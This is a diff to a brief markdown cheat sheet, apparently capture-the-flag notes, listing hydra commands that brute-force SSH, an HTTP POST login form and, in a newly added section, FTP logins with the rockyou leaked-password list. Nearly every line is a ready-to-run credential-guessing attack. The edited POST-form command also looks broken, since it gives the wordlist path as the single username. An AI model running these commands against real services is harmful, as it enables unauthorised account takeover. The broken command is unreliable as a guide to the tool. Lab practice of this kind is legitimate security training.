@@ -18,7 +18,7 @@
 
 **Examples:**
 
-- `hydra -l molly -P /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.133.61 ssh -V`
+- `hydra -l molly -P /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt $(cat ip) ssh -V`
 
 ## POST login form
 
@@ -32,8 +32,12 @@
 
 **Examples:**
 
-- `hydra -l molly -P /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.133.61 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V`
+- `hydra -l /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt -P /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt $(cat ip) http-post-form "/login:username=^USER^&password=^PASS^:F=invalid" -V`
 
 ## Wordlist locations to copy
 
 `/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt`
+
+## FTP hacking
+
+- `hydra -l chris -P ../../wordlists/rockyou.txt ftp://$(cat ip) -V`
